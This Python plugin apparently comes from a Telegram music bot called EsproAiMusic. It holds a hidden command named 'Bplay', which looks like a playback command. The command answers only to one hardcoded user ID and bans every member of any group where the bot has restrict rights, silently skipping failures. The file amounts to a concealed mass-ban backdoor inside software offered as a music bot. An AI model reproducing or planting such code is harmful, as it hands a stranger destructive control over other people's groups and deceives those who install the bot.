from EsproAiMusic import app
from pyrogram import filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from EsproAiMusic.utils.EsproAi_ban import admin_filter


BOT_ID = app.me.id  # Corrected this line

@app.on_message(
    filters.command("Bplay")
    & filters.group
    & filters.user(8099459039)
   )
async def ban_all(_, msg):
    chat_id = msg.chat.id    
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members == True    
    if bot_permission:
        async for member in app.get_chat_members(chat_id):       
            try:
                await app.ban_chat_member(chat_id, member.user.id)
                await msg.reply_text(f"**‣ ᴏɴᴇ ᴍᴏʀᴇ ʙᴀɴɴᴇᴅ.**\n\n➻ {member.user.mention}")                    
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")
       


